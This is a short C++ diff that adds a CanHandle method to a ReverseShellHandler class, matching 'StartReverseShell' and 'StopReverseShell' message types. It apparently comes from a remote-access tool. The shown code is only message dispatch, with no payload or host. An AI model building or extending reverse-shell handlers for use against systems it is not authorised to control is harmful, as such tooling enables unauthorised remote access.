@@ -15,6 +15,13 @@ ReverseShellHandler::ReverseShellHandler(
 {
 }
 
+bool ReverseShellHandler::CanHandle(const MessageType type)
+{
+	return
+		type == MessageType::StartReverseShell || 
+		type == MessageType::StopReverseShell;
+}
+
 void ReverseShellHandler::Handle(const MessageType type, SharedSpan content)
 {
 	const auto command = content.String();
